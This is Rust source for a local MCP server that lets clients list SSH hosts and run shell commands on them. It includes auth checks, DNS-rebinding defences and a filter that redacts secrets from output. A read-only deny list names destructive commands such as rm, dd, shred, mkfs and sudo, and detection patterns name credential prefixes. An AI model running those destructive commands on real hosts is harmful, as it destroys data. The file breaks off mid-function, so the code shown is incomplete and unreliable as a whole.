//! Minimal MCP server (streamable HTTP transport, JSON-RPC over POST).
//! Exposes hss hosts to MCP clients: `list-servers` and `execute-command`.
//!
//! Set `HSS_MCP_TOKEN` env var or `mcp_token` in config.toml to require a
//! Bearer token. When unset the server accepts unauthenticated requests for
//! `list-servers` only (unless `allow_unauthenticated_execute` is enabled).
//! Hosts/credentials are re-read from disk on every tool call, so changes
//! made in a second hss window are visible without restart.

use anyhow::Result;
use serde_json::{json, Value};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Instant;

pub const MCP_PORT: u16 = 8822;
const MAX_CONCURRENT_TOOL_CALLS: usize = 8;

static ACTIVE_TOOL_CALLS: AtomicUsize = AtomicUsize::new(0);

struct ActiveCallGuard;

impl Drop for ActiveCallGuard {
    fn drop(&mut self) {
        ACTIVE_TOOL_CALLS.fetch_sub(1, Ordering::SeqCst);
    }
}

/// Severity of a log entry; drives colour in the MCP screen.
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Level {
    Info,
    Req,
    Ok,
    Err,
}

impl Level {
    pub fn label(self) -> &'static str {
        match self {
            Level::Info => "INFO",
            Level::Req => "CALL",
            Level::Ok => " OK ",
            Level::Err => "FAIL",
        }
    }
}

/// One structured line: when it happened, how bad it is, which subsystem,
/// a one-line summary and optional indented detail lines.
#[derive(Debug, Clone)]
pub struct LogEntry {
    pub at: f64, // seconds since server start
    pub level: Level,
    pub tag: String,
    pub msg: String,
    pub detail: Vec<String>,
}

#[derive(Debug, Default)]
pub struct LogState {
    pub entries: Vec<LogEntry>,
    pub requests: u64,
    pub tool_calls: u64,
    pub errors: u64,
    pub client: Option<String>,
    pub log_file: Option<std::path::PathBuf>,
}

pub type Log = Arc<Mutex<LogState>>;

pub struct McpServer {
    server: Arc<tiny_http::Server>,
    thread: Option<std::thread::JoinHandle<()>>,
    pub log: Log,
    pub started: Instant,
    pub port: u16,
}

impl McpServer {
    pub fn start() -> Result<Self> {
        let cfg = crate::config::load_config()
            .map_err(|e| anyhow::anyhow!("Failed to load configuration for MCP server: {e}"))?;
        Self::start_with_config(&cfg)
    }

    pub fn start_with_config(cfg: &crate::config::AppConfig) -> Result<Self> {
        let port = if cfg.mcp_port != 0 {
            cfg.mcp_port
        } else {
            MCP_PORT
        };
        let server = tiny_http::Server::http(("127.0.0.1", port))
            .map_err(|e| anyhow::anyhow!("MCP server failed to bind 127.0.0.1:{port}: {e}"))?;
        let actual_port = server
            .server_addr()
            .to_ip()
            .map(|a| a.port())
            .unwrap_or(port);
        let server = Arc::new(server);

        let log_file = cfg.mcp_log_file.as_deref().and_then(|p| {
            let p = p.trim();
            if p.is_empty() {
                None
            } else {
                Some(std::path::PathBuf::from(crate::config::expand_tilde(p)))
            }
        });

        let log: Log = Arc::new(Mutex::new(LogState {
            log_file,
            ..Default::default()
        }));
        let started = Instant::now();

        let token = resolve_mcp_token(cfg);
        let allow_unauthenticated = cfg.allow_unauthenticated_execute;
        let auth_hint = if token.is_some() {
            "auth: bearer token required"
        } else if allow_unauthenticated {
            "auth: none (WARNING: allow_unauthenticated_execute enabled)"
        } else {
            "auth: list-only (execute-command requires mcp_token or allow_unauthenticated_execute)"
        };
        log_line(
            &log,
            started,
            Level::Info,
            "server",
            format!("listening on http://127.0.0.1:{actual_port}"),
            vec![
                "transport: streamable HTTP (JSON-RPC over POST)".into(),
                "tools: list-servers, execute-command".into(),
                auth_hint.into(),
            ],
        );

        let (srv, lg) = (server.clone(), log.clone());
        let thread =
            std::thread::spawn(move || serve_loop(srv, lg, started, token, allow_unauthenticated));
        Ok(Self {
            server,
            thread: Some(thread),
            log,
            started,
            port: actual_port,
        })
    }

    pub fn url() -> String {
        let port = crate::config::load_config()
            .map(|c| c.mcp_port)
            .unwrap_or(MCP_PORT);
        let port = if port != 0 { port } else { MCP_PORT };
        format!("http://127.0.0.1:{port}")
    }

    pub fn server_url(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    pub fn stop(mut self) {
        self.server.unblock();
        if let Some(t) = self.thread.take() {
            let _ = t.join();
        }
    }
}

fn log_line(
    log: &Log,
    started: Instant,
    level: Level,
    tag: &str,
    msg: String,
    detail: Vec<String>,
) {
    let mut l = log.lock().unwrap();
    if level == Level::Err {
        l.errors += 1;
    }

    if let Some(ref path) = l.log_file {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        if let Some(parent) = path.parent() {
            let _ = crate::config::ensure_config_dir(parent);
        }
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .mode(0o600)
            .open(path)
        {
            let at = started.elapsed().as_secs_f64();
            let _ = writeln!(f, "[{:>7.2}s] [{}] [{:<8}] {}", at, level.label(), tag, msg);
            for d in &detail {
                let _ = writeln!(f, "    | {d}");
            }
        }
    }

    l.entries.push(LogEntry {
        at: started.elapsed().as_secs_f64(),
        level,
        tag: tag.to_string(),
        msg,
        detail,
    });
    // Cap log memory to 500 entries
    if l.entries.len() > 500 {
        let drop = l.entries.len() - 500;
        l.entries.drain(..drop);
    }
}

/// Shorten a value for single-line display.
fn clip(s: &str, max: usize) -> String {
    let one_line = s.replace('\n', "⏎");
    if one_line.chars().count() <= max {
        return one_line;
    }
    let head: String = one_line.chars().take(max.saturating_sub(1)).collect();
    format!("{head}…")
}

/// Truncate a UTF-8 string cleanly at or before `max_bytes` without splitting a code point.
fn truncate_utf8(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut idx = max_bytes;
    while idx > 0 && !s.is_char_boundary(idx) {
        idx -= 1;
    }
    &s[..idx]
}

fn resolve_mcp_token(cfg: &crate::config::AppConfig) -> Option<String> {
    if let Ok(t) = std::env::var("HSS_MCP_TOKEN") {
        let t = t.trim().to_string();
        if !t.is_empty() {
            return Some(t);
        }
    }
    if let Some(ref t) = cfg.mcp_token {
        let t = t.trim().to_string();
        if !t.is_empty() {
            return Some(t);
        }
    }
    None
}

/// Constant-time string comparison to avoid leaking Bearer token bytes via timing.
fn constant_time_eq(a: &str, b: &str) -> bool {
    let ab = a.as_bytes();
    let bb = b.as_bytes();
    let mut diff = ab.len() ^ bb.len();
    let len = ab.len().max(bb.len());
    for i in 0..len {
        let x = ab.get(i).copied().unwrap_or(0);
        let y = bb.get(i).copied().unwrap_or(0);
        diff |= usize::from(x ^ y);
    }
    std::hint::black_box(diff) == 0
}

fn check_auth(request: &tiny_http::Request, token: &Option<String>) -> bool {
    let Some(expected) = token else { return true };
    for h in request.headers() {
        if h.field.equiv("Authorization") {
            if let Some(bearer) = h.value.as_str().strip_prefix("Bearer ") {
                return constant_time_eq(bearer.trim(), expected);
            }
        }
    }
    false
}

/// Validate that a Host header targets loopback (blocks DNS rebinding attacks).
fn is_loopback_host(host: &str) -> bool {
    let host = host.trim();
    if host.is_empty() {
        return false;
    }
    let host_only = if let Some(rest) = host.strip_prefix('[') {
        let Some(end) = rest.find(']') else {
            return false;
        };
        let after = &rest[end + 1..];
        if !after.is_empty() {
            let Some(port) = after.strip_prefix(':') else {
                return false;
            };
            if port.parse::<u16>().is_err() {
                return false;
            }
        }
        &rest[..end]
    } else if let Some((h, p)) = host.rsplit_once(':') {
        if p.parse::<u16>().is_ok() && !h.contains(':') {
            h
        } else {
            host
        }
    } else {
        host
    };

    host_only == "127.0.0.1"
        || host_only.eq_ignore_ascii_case("localhost")
        || host_only == "::1"
}

/// Validate that an Origin header (if present) comes from loopback (blocks cross-origin CSRF).
fn is_allowed_origin(origin: &str) -> bool {
    let origin = origin.trim();
    let rest = origin
        .strip_prefix("http://")
        .or_else(|| origin.strip_prefix("https://"));
    let Some(rest) = rest else {
        return false;
    };
    let authority = rest.split('/').next().unwrap_or("");
    is_loopback_host(authority)
}

fn check_host_and_origin(request: &tiny_http::Request) -> Option<&'static str> {
    for h in request.headers() {
        if h.field.equiv("Host") && !is_loopback_host(h.value.as_str()) {
            return Some("Forbidden: non-loopback Host header");
        }
        if h.field.equiv("Origin") && !is_allowed_origin(h.value.as_str()) {
            return Some("Forbidden: non-loopback Origin header");
        }
    }
    None
}

fn serve_loop(
    server: Arc<tiny_http::Server>,
    log: Log,
    started: Instant,
    token: Option<String>,
    allow_unauthenticated_execute: bool,
) {
    for mut request in server.incoming_requests() {
        let method = request.method().clone();
        let url = request.url().to_string();

        // Host & Origin validation (DNS rebinding + browser CSRF defense)
        if let Some(reason) = check_host_and_origin(&request) {
            log_line(
                &log,
                started,
                Level::Err,
                "security",
                format!("rejected: {reason}"),
                vec![format!("{} {}", method, request.url())],
            );
            let _ = request.respond(make_response(403, Some(json!({"error": reason}))));
            continue;
        }

        // Path check: only / or /mcp endpoint
        if url != "/" && url != "/mcp" {
            let _ = request.respond(make_response(404, Some(json!({"error": "not found"}))));
            continue;
        }

        // Auth check (applies to all methods when a token is configured)
        let is_authed = check_auth(&request, &token);
        if token.is_some() && !is_authed {
            log_line(
                &log,
                started,
                Level::Err,
                "auth",
                "rejected: invalid or missing Bearer token".into(),
                vec![format!("{} {}", method, request.url())],
            );
            let _ = request.respond(make_response(401, Some(json!({"error": "unauthorized"}))));
            continue;
        }

        // Fast path: non-POST requests are answered inline.
        if method != tiny_http::Method::Post {
            let (status, body) = match method {
                tiny_http::Method::Delete => {
                    log_line(
                        &log,
                        started,
                        Level::Info,
                        "http",
                        "session closed by client (DELETE)".into(),
                        vec![],
                    );
                    (200, None)
                }
                other => {
                    log_line(
                        &log,
                        started,
                        Level::Err,
                        "http",
                        format!("rejected {other} {}", request.url()),
                        vec!["only POST (JSON-RPC) and DELETE are supported".into()],
                    );
                    (405, None)
                }
            };
            let _ = request.respond(make_response(status, body));
            continue;
        }

        // Content-Type validation: require application/json for POST
        let has_json_ct = request.headers().iter().any(|h| {
            h.field.equiv("Content-Type") && h.value.as_str().starts_with("application/json")
        });
        if !has_json_ct {
            let _ = request.respond(make_response(
                415,
                Some(json!({"error": "Unsupported Media Type: application/json required"})),
            ));
            continue;
        }

        // Content-Length check if present
        const MAX_BODY_BYTES: u64 = 1024 * 1024; // 1 MiB
        let content_length = request
            .headers()
            .iter()
            .find(|h| h.field.equiv("Content-Length"))
            .and_then(|h| h.value.as_str().parse::<u64>().ok());

        if let Some(cl) = content_length {
            if cl > MAX_BODY_BYTES {
                let _ = request.respond(make_response(
                    413,
                    Some(json!({"error": "Payload Too Large: maximum body size is 1 MiB"})),
                ));
                continue;
            }
        }

        // Read the body in the accept thread (bounded to 1 MiB + 1 byte to detect overflow).
        let mut buf = String::new();
        let read_res = std::io::Read::read_to_string(
            &mut std::io::Read::take(request.as_reader(), MAX_BODY_BYTES + 1),
            &mut buf,
        );
        if read_res.is_err() || buf.len() > MAX_BODY_BYTES as usize {
            let _ = request.respond(make_response(
                413,
                Some(json!({"error": "Payload Too Large: maximum body size is 1 MiB"})),
            ));
            continue;
        }

        // Peek at the method to decide sync vs async.
        let rpc_method = serde_json::from_str::<Value>(&buf)
            .ok()
            .and_then(|v| v.get("method").and_then(|m| m.as_str()).map(String::from));

        let is_tool_call = rpc_method.as_deref() == Some("tools/call");

        let auth_for_exec = (token.is_some() && is_authed) || allow_unauthenticated_execute;

        if is_tool_call {
            // Tool calls may run SSH commands that take minutes.
            // Atomically reserve a concurrency slot (released via RAII guard even on panic).
            let reserved = ACTIVE_TOOL_CALLS.fetch_update(
                Ordering::SeqCst,
                Ordering::SeqCst,
                |cur| (cur < MAX_CONCURRENT_TOOL_CALLS).then_some(cur + 1),
            );
            if reserved.is_err() {
                let _ = request.respond(make_response(
                    429,
                    Some(json!({
                        "jsonrpc": "2.0",
                        "error": {
                            "code": -32000,
                            "message": "Too Many Requests: server is busy executing tools"
                        }
                    })),
                ));
                continue;
            }

            let guard = ActiveCallGuard;
            let lg = log.clone();
            std::thread::spawn(move || {
                let _guard = guard;
                let (status, body) = handle_rpc(&buf, &lg, started, auth_for_exec);
                let _ = request.respond(make_response(status, body));
            });
        } else {
            // Fast RPC: ping, initialize, tools/list, notifications.
            let (status, body) = handle_rpc(&buf, &log, started, auth_for_exec);
            let _ = request.respond(make_response(status, body));
        }
    }
}

fn make_response(
    status: u16,
    body: Option<Value>,
) -> tiny_http::Response<std::io::Cursor<Vec<u8>>> {
    match body {
        Some(json) => {
            let bytes = json.to_string().into_bytes();
            let len = bytes.len();
            tiny_http::Response::new(
                tiny_http::StatusCode(status),
                vec!["Content-Type: application/json"
                    .parse::<tiny_http::Header>()
                    .unwrap()],
                std::io::Cursor::new(bytes),
                Some(len),
                None,
            )
        }
        None => tiny_http::Response::new(
            tiny_http::StatusCode(status),
            vec![],
            std::io::Cursor::new(vec![]),
            Some(0),
            None,
        ),
    }
}

/// Process JSON-RPC request body and return response JSON if any.
pub fn process_json_rpc(body: &str) -> Option<Value> {
    let log: Log = Arc::new(Mutex::new(LogState::default()));
    let (_, resp) = handle_rpc(body, &log, Instant::now(), true);
    resp
}

/// Run headless MCP server over stdio (JSON-RPC newline-delimited stream)
pub fn run_stdio(verbose: bool) -> Result<()> {
    use std::io::{BufRead, Write};
    let stdin = std::io::stdin();
    let mut stdout = std::io::stdout();

    let log: Log = Arc::new(Mutex::new(LogState::default()));
    let started = Instant::now();

    if verbose {
        eprintln!("hss mcp: ready; waiting for newline-delimited JSON-RPC on stdin");
    }
    for line in stdin.lock().lines() {
        let line = line?;
        if line.trim().is_empty() {
            continue;
        }
        let request_started = Instant::now();
        let method = if verbose {
            let method = serde_json::from_str::<Value>(&line)
                .ok()
                .and_then(|req| req.get("method").and_then(Value::as_str).map(str::to_owned))
                .unwrap_or_else(|| "invalid JSON-RPC".into());
            eprintln!("hss mcp: received {method}");
            method
        } else {
            String::new()
        };
        let (_, resp) = handle_rpc(&line, &log, started, true);
        if let Some(resp_val) = resp {
            let json_str = serde_json::to_string(&resp_val)?;
            writeln!(stdout, "{json_str}")?;
            stdout.flush()?;
        }
        if verbose {
            eprintln!(
                "hss mcp: finished {method} in {} ms",
                request_started.elapsed().as_millis()
            );
        }
    }
    if verbose {
        eprintln!("hss mcp: stdin closed; exiting");
    }
    Ok(())
}

/// Returns (http status, optional JSON-RPC response body).
fn handle_rpc(
    body: &str,
    log: &Log,
    started: Instant,
    auth_for_exec: bool,
) -> (u16, Option<Value>) {
    log.lock().unwrap().requests += 1;

    let Ok(req) = serde_json::from_str::<Value>(body) else {
        log_line(
            log,
            started,
            Level::Err,
            "rpc",
            "malformed JSON request".into(),
            vec![format!("body: {}", clip(body, 120))],
        );
        return (400, Some(rpc_error(Value::Null, -32700, "Parse error")));
    };
    let id = req.get("id").cloned();
    let method = req.get("method").and_then(|m| m.as_str()).unwrap_or("");

    // Notifications get no response body
    let Some(id) = id else {
        log_line(
            log,
            started,
            Level::Info,
            "rpc",
            format!("notification {method}"),
            vec![],
        );
        return (202, None);
    };
    let id_str = id.to_string();

    let result = match method {
        "initialize" => {
            let proto = req
                .pointer("/params/protocolVersion")
                .and_then(|v| v.as_str())
                .unwrap_or("2025-03-26");
            let client = req
                .pointer("/params/clientInfo/name")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let client_ver = req
                .pointer("/params/clientInfo/version")
                .and_then(|v| v.as_str())
                .unwrap_or("?");
            log.lock().unwrap().client = Some(format!("{client} {client_ver}"));
            log_line(
                log,
                started,
                Level::Ok,
                "session",
                format!("client connected: {client} {client_ver}"),
                vec![
                    format!("protocol: {proto}"),
                    format!("server: hss {}", env!("CARGO_PKG_VERSION")),
                ],
            );
            json!({
                "protocolVersion": proto,
                "capabilities": { "tools": {} },
                "serverInfo": { "name": "hss", "version": env!("CARGO_PKG_VERSION") }
            })
        }
        "ping" => {
            log_line(log, started, Level::Info, "rpc", "ping".into(), vec![]);
            json!({})
        }
        "tools/list" => {
            log_line(
                log,
                started,
                Level::Info,
                "rpc",
                "tools/list → 2 tools".into(),
                vec!["list-servers, execute-command".into()],
            );
            json!({ "tools": tool_definitions() })
        }
        "tools/call" => {
            let name = req
                .pointer("/params/name")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let args = req
                .pointer("/params/arguments")
                .cloned()
                .unwrap_or(json!({}));
            call_tool(name, &args, log, started, &id_str, auth_for_exec)
        }
        _ => {
            log_line(
                log,
                started,
                Level::Err,
                "rpc",
                format!("unknown method: {method}"),
                vec![format!("request id {id_str}")],
            );
            return (
                200,
                Some(rpc_error(
                    id,
                    -32601,
                    &format!("Method not found: {method}"),
                )),
            );
        }
    };

    (
        200,
        Some(json!({ "jsonrpc": "2.0", "id": id, "result": result })),
    )
}

fn rpc_error(id: Value, code: i64, message: &str) -> Value {
    json!({ "jsonrpc": "2.0", "id": id, "error": { "code": code, "message": message } })
}

/// Case-insensitive glob matcher supporting `*` anywhere in `pattern`.
fn glob_match_ci(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().map(|c| c.to_ascii_lowercase()).collect();
    let t: Vec<char> = text.chars().map(|c| c.to_ascii_lowercase()).collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let mut star_idx: Option<usize> = None;
    let mut match_idx = 0usize;

    while ti < t.len() {
        if pi < p.len() && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star_idx = Some(pi);
            match_idx = ti;
            pi += 1;
        } else if let Some(star) = star_idx {
            pi = star + 1;
            match_idx += 1;
            ti = match_idx;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// Checks whether `host` is allowed by the MCP allowed_hosts pattern.
/// Pattern can be comma-separated list of names/wildcards or "tag:xyz" or "*".
pub fn is_host_allowed_for_mcp(pattern: &str, host: &crate::types::Host) -> bool {
    let pattern = pattern.trim();
    if pattern.is_empty() || pattern == "*" {
        return true;
    }

    for rule in pattern.split(',') {
        let rule = rule.trim();
        if rule.is_empty() {
            continue;
        }
        if rule == "*" {
            return true;
        }
        if let Some(tag_req) = rule.strip_prefix("tag:") {
            if host.tags.iter().any(|t| t.eq_ignore_ascii_case(tag_req)) {
                return true;
            }
            continue;
        }
        if glob_match_ci(rule, &host.name) || glob_match_ci(rule, &host.ip) {
            return true;
        }
    }
    false
}

fn is_token_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '+' | '/' | '=')
}

/// Redact tokens starting with known secret prefixes (e.g. `ghp_`, `xoxb-`, `sk-`, `AKIA`).
fn redact_prefixed_tokens(line: &str) -> String {
    let prefixes: &[(&str, usize, &str)] = &[
        ("github_pat_", 20, "[REDACTED:TOKEN]"),
        ("ghp_", 20, "[REDACTED:TOKEN]"),
        ("gho_", 20, "[REDACTED:TOKEN]"),
        ("ghs_", 20, "[REDACTED:TOKEN]"),
        ("ghu_", 20, "[REDACTED:TOKEN]"),
        ("xoxb-", 10, "[REDACTED:TOKEN]"),
        ("xoxp-", 10, "[REDACTED:TOKEN]"),
        ("xoxa-", 10, "[REDACTED:TOKEN]"),
        ("xoxr-", 10, "[REDACTED:TOKEN]"),
        ("xoxs-", 10, "[REDACTED:TOKEN]"),
        ("sk-proj-", 20, "[REDACTED:API_KEY]"),
        ("sk-ant-", 20, "[REDACTED:API_KEY]"),
        ("sk-", 20, "[REDACTED:API_KEY]"),
        ("AKIA", 16, "[REDACTED:AWS_KEY]"),
        ("ASIA", 16, "[REDACTED:AWS_KEY]"),
    ];

    let mut result = line.to_string();
    for &(prefix, min_tail, replacement) in prefixes {
        let mut search_from = 0usize;
        while let Some(rel) = result[search_from..].find(prefix) {
            let start = search_from + rel;
            let boundary_ok = start == 0
                || !result[..start]
                    .chars()
                    .next_back()
                    .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
            if !boundary_ok {
                search_from = start + prefix.len();
                continue;
            }
            let after_prefix = start + prefix.len();
            let tail_len = result[after_prefix..]
                .char_indices()
                .take_while(|&(_, c)| is_token_char(c))
                .last()
                .map(|(i, c)| i + c.len_utf8())
                .unwrap_or(0);
            let is_aws = prefix == "AKIA" || prefix == "ASIA";
            let valid_match = if is_aws {
                tail_len == 16
                    && result[after_prefix..after_prefix + tail_len]
                        .bytes()
                        .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
            } else {
                tail_len >= min_tail
            };
            if valid_match {
                result.replace_range(start..after_prefix + tail_len, replacement);
                search_from = start + replacement.len();
            } else {
                search_from = after_prefix;
            }
        }
    }
    result
}

fn is_sensitive_env_key(key: &str) -> bool {
    let upper = key.trim().to_ascii_uppercase();
    if upper.is_empty()
        || !upper
            .bytes()
            .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_')
    {
        return false;
    }
    const MARKERS: &[&str] = &[
        "PASSWORD",
        "PASSWD",
        "SECRET",
        "API_KEY",
        "APIKEY",
        "PRIVATE_KEY",
        "ACCESS_TOKEN",
        "AUTH_TOKEN",
        "REFRESH_TOKEN",
        "SESSION_TOKEN",
        "BEARER_TOKEN",
        "DB_PASS",
    ];
    MARKERS.iter().any(|m| upper.contains(m)) || upper.ends_with("_TOKEN") || upper == "TOKEN"
}

fn redact_single_line(line: &str) -> String {
    // 1. Authorization: Bearer / Basic headers
    let lower = line.to_ascii_lowercase();
    if let Some(idx) = lower.find("authorization:") {
        let after = &line[idx + "authorization:".len()..];
        let trimmed = after.trim_start();
        let trimmed_lower = trimmed.to_ascii_lowercase();
        if trimmed_lower.starts_with("bearer ") || trimmed_lower.starts_with("basic ") {
            let prefix = &line[..idx + "authorization:".len()];
            return format!("{prefix} [REDACTED:AUTH_HEADER]");
        }
    }

    // 2. Sensitive KEY=VALUE or `export KEY=VALUE` assignments
    let check_part = line
        .trim_start()
        .strip_prefix("export ")
        .unwrap_or(line.trim_start());
    if let Some(eq_idx) = check_part.find('=') {
        let key = &check_part[..eq_idx];
        let val = check_part[eq_idx + 1..].trim();
        if is_sensitive_env_key(key) && !val.is_empty() {
            let lead_len = line.len() - check_part.len();
            let prefix = &line[..lead_len + eq_idx + 1];
            return format!("{prefix}[REDACTED]");
        }
    }

    // 3. Inline known token prefixes (GitHub, Slack, AWS, sk-* API keys)
    redact_prefixed_tokens(line)
}

/// DLP filter: redacts private keys, auth headers, sensitive env assignments, and API tokens.
pub fn redact_sensitive_output(text: &str) -> String {
    let mut out = String::new();
    let mut in_private_key = false;

    for line in text.lines() {
        if line.contains("-----BEGIN") && line.contains("PRIVATE KEY") {
            in_private_key = true;
            out.push_str("[REDACTED: PRIVATE KEY DETECTED]\n");
            continue;
        }
        if in_private_key {
            if line.contains("-----END") && line.contains("PRIVATE KEY") {
                in_private_key = false;
            }
            continue;
        }
        out.push_str(&redact_single_line(line));
        out.push('\n');
    }

    if text.ends_with('\n') || out.is_empty() {
        out
    } else {
        out.pop();
        out
    }
}

/// Normalize a command token by stripping quotes, backslash escapes, and path prefixes.
fn normalize_cmd_word(raw: &str) -> String {
    let unquoted = raw.trim_matches(|c| c == '\'' || c == '"');
    let no_escape = unquoted.replace('\\', "");
    let base = no_escape.rsplit('/').next().unwrap_or(&no_escape);
    base.to_ascii_lowercase()
}

/// Returns true if `cmd` contains an output redirection other than `/dev/null` or `2>&1`.
fn has_mutating_redirection(cmd: &str) -> bool {
    let bytes = cmd.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;

    while i < bytes.len() {
        match bytes[i] {
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b'>' if !in_single && !in_double => {
                // Allow fd duplication like `2>&1` and discarding to `/dev/null`
                let rest = cmd[i + 1..].trim_start();
                let is_fd_dup = rest.starts_with("&1") || rest.starts_with("&2");
                let target = rest.trim_start_matches('>').trim_start();
                let is_dev_null = target == "/dev/null"
                    || target.starts_with("/dev/null ")
                    || target.starts_with("/dev/null;")
                    || target.starts_with("/dev/null|")
                    || target.starts_with("/dev/null&");
                if !is_fd_dup && !is_dev_null {
                    return true;
                }
                if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                    i += 1;
                }
            }
            _ => {}
        }
        i += 1;
    }
    false
}

/// Checks if a command is destructive or mutating and therefore prohibited under read-only mode.
pub fn is_prohibited_command_in_read_only(cmd: &str) -> Option<&'static str> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return None;
    }

    // Block command substitution (`$(...)` and backticks) because inner commands cannot be vetted safely
    if trimmed.contains("$(") || trimmed.contains('`') {
        return Some("command substitution in read-only mode");
    }

    // Block file-writing redirections (`>`, `>>`, `>|`) except `/dev/null` and `2>&1`
    if has_mutating_redirection(trimmed) {
        return Some("output redirection (file write)");
    }

    // Split into shell segments on operators
    for segment in trimmed.split([';', '|', '&', '\n', '\r', '(', ')']) {
        let tokens: Vec<&str> = segment.split_whitespace().collect();
        if tokens.is_empty() {
            continue;
        }

        // Skip leading env assignments (`FOO=bar`) and transparent wrappers (`env`, `command`, `nohup`, ...)
        let mut idx = 0;
        while idx < tokens.len() {
            let tok = tokens[idx];
            if tok.contains('=') && !tok.starts_with('-') && !tok.starts_with('/') {
                idx += 1;
                continue;
            }
            let base = normalize_cmd_word(tok);
            match base.as_str() {
                "env" | "command" | "builtin" | "nohup" | "time" | "nice" | "ionice" => {
                    idx += 1;
                    while idx < tokens.len() && tokens[idx].starts_with('-') {
                        idx += 1;
                    }
                    continue;
                }
                "timeout" => {
                    idx += 1;
                    while idx < tokens.len() && tokens[idx].starts_with('-') {
                        idx += 1;
                    }
                    // Skip duration argument
                    if idx < tokens.len() {
                        idx += 1;
                    }
                    continue;
                }
                _ => break,
            }
        }

        if idx >= tokens.len() {
            continue;
        }

        let cmd_name = normalize_cmd_word(tokens[idx]);
        let args = &tokens[idx + 1..];

        // Direct prohibited commands
        match cmd_name.as_str() {
            "rm" => return Some("rm (file removal)"),
            "rmdir" => return Some("rmdir (directory removal)"),
            "mv" => return Some("mv (file move/overwrite)"),
            "cp" => return Some("cp (file copy/overwrite)"),
            "dd" => return Some("dd (raw write)"),
            "shred" | "wipefs" => return Some("disk/file wipe utility"),
            "fdisk" | "parted" | "sfdisk" | "gdisk" => return Some("disk partitioning utility"),
            "shutdown" => return Some("shutdown"),
            "reboot" => return Some("reboot"),
            "poweroff" | "halt" => return Some("poweroff/halt"),
            "init" | "telinit" => return Some("init/runlevel change"),
            "sudo" | "doas" | "pkexec" => return Some("privilege escalation"),
            "su" => return Some("su (user switch)"),
            "chmod" | "chown" | "chgrp" => return Some("permission/ownership modification"),
            "kill" | "killall" | "pkill" => return Some("process termination"),
            "passwd" | "chpasswd" | "useradd" | "userdel" | "usermod" | "groupadd" | "groupdel"
            | "groupmod" => return Some("account/group modification"),
            "tee" | "truncate" | "touch" | "mkdir" | "ln" | "install" => {
                return Some("filesystem write/modification")
            }
            "eval" | "exec" | "source" | "." => return Some("dynamic shell execution"),
            "xargs" => return Some("xargs (indirect command execution)"),
            "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" => {
                return Some("subshell execution in read-only mode")
            }
            "crontab" | "at" => return Some("scheduled task modification"),
            "mount" | "umount" => return Some("mount modification"),
            "iptables" | "ip6tables" | "nft" | "ufw" => return Some("firewall modification"),
            "apt" | "apt-get" | "dpkg" | "yum" | "dnf" | "rpm" | "pacman" | "apk" | "pip"
            | "pip3" => return Some("package manager command"),
            _ if cmd_name.starts_with("mkfs") => return Some("mkfs (filesystem format)"),
            _ => {}
        }

        // Subcommand/flag-specific prohibitions for otherwise useful inspection tools
        if cmd_name == "sed" && args.iter().any(|a| *a == "-i" || a.starts_with("-i")) {
            return Some("sed -i (in-place file edit)");
        }
        if cmd_name == "find"
            && args
                .iter()
                .any(|a| matches!(*a, "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir"))
        {
            return Some("find with -delete/-exec");
        }
        if cmd_name == "sysctl" && args.iter().any(|a| *a == "-w" || a.contains('=')) {
            return Some("sysctl write");
        }
        if cmd_name == "systemctl" {
            if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
                if matches!(
                    sub.to_ascii_lowercase().as_str(),
                    "start"
                        | "stop"
                        | "restart"
                        | "reload"
                        | "reload-or-restart"
                        | "enable"
                        | "disable"
                        | "mask"
                        | "unmask"
                        | "kill"
                        | "reboot"
                        | "poweroff"
                        | "halt"
                ) {
                    return Some("systemctl mutating action");
                }
            }
        }
        if cmd_name == "docker" || cmd_name == "podman" {
            if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
                if matches!(
                    sub.to_ascii_lowercase().as_str(),
                    "rm" | "rmi"
                        | "kill"
                        | "stop"
                        | "start"
                        | "restart"
                        | "run"
                        | "exec"
                        | "prune"
                        | "build"
                        | "push"
                        | "pull"
                        | "create"
                        | "cp"
                ) {
                    return Some("container mutating action");
                }
            }
        }
    }
    None
}

pub fn tool_definitions() -> Value {
    json!([
        {
            "name": "list-servers",
            "description": "List all SSH servers configured in hss (name, group, address, port, tags).",
            "inputSchema": { "type": "object", "properties": {} }
        },
        {
            "name": "execute-command",
            "description": "Execute a shell command on one of the configured SSH servers and return its output.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "host": { "type": "string", "description": "Server name or IP as configured in hss" },
                    "command": { "type": "string", "description": "Shell command to execute" }
                },
                "required": ["host", "command"]
            }
        }
    ])
}

fn call_tool(
    name: &str,
    args: &Value,
    log: &Log,
    started: Instant,
    req_id: &str,
    auth_for_exec: bool,
) -> Value {
    log.lock().unwrap().tool_calls += 1;
    let t0 = Instant::now();

    match name {
        "list-servers" => {
            log_line(
                log,
                started,
                Level::Req,
                "tool",
                "list-servers".into(),
                vec![format!("request id {req_id} · no arguments")],
            );
            let cfg = crate::config::load_config().unwrap_or_default();
            match crate::config::load_hosts() {
                Ok(all_hosts) => {
                    let allowed_hosts: Vec<_> = all_hosts
                        .into_iter()
